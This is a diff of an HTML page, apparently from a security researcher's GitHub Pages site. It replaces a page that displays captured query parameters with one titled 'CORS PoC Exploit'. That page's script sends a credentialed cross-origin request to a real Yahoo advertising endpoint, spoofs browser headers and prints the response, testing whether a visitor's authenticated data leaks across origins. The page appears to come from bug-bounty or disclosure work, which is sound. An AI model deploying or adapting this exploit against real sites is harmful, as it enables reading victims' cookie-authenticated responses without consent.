@@ -3,55 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>PoC Capture Page</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-        }
-        #output {
-            white-space: pre-wrap; /* Display whitespace and line breaks */
-            background-color: #f4f4f4;
-            padding: 15px;
-            border-radius: 5px;
-            border: 1px solid #ccc;
-        }
-        h1 {
-            color: #333;
-        }
-    </style>
+    <title>CORS PoC</title>
 </head>
 <body>
-    <h1>Captured Request Data</h1>
-    <p id="output">Loading captured data...</p>
+    <h1>CORS PoC Exploit</h1>
+    <p id="response">Waiting for response...</p>
     <script>
-        function escapeHtml(unsafe) {
-            return unsafe
-                .replace(/&/g, "&amp;")
-                .replace(/</g, "&lt;")
-                .replace(/>/g, "&gt;")
-                .replace(/"/g, "&quot;")
-                .replace(/'/g, "&#039;");
-        }
-
-        function displayCapturedData() {
-            const output = document.getElementById('output');
-            const params = new URLSearchParams(window.location.search);
-            let outputText = "Captured Parameters:\n\n";
-
-            if (params.toString()) {
-                params.forEach((value, key) => {
-                    outputText += `${escapeHtml(key)}: ${escapeHtml(value)}\n`;
-                });
-            } else {
-                outputText = "No query parameters found.";
+        
+        fetch("https://pbs.yahoo.com/setuid?bidder=rubicon&uid=M0E7H6C0-22-3QAV&gdpr=0&us_privacy=1---&b=ky9oe74xow1", {
+            method: "GET",
+            credentials: "include", 
+            headers: {
+                "Origin": "https://stargazer0.github.io", 
+                "Accept-Language": "ko-KR",
+                "Sec-Fetch-Site": "cross-site",
+                "Sec-Fetch-Mode": "navigate",
+                "Sec-Fetch-Dest": "iframe",
+                "Sec-Ch-Ua": "\"Chromium\";v=\"127\", \"Not)A;Brand\";v=\"99\"",
+                "Sec-Ch-Ua-Platform": "\"Windows\"",
+                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
             }
-
-            output.textContent = outputText;
-        }
-
-        // Run the display function after the DOM is fully loaded
-        document.addEventListener("DOMContentLoaded", displayCapturedData);
+        })
+        .then(response => {
+            return response.text();
+        })
+        .then(data => {
+            document.getElementById("response").textContent = `Response: ${data}`;
+        })
+        .catch(error => {
+            document.getElementById("response").textContent = `Error: ${error.message}`;
+        });
     </script>
 </body>
 </html>
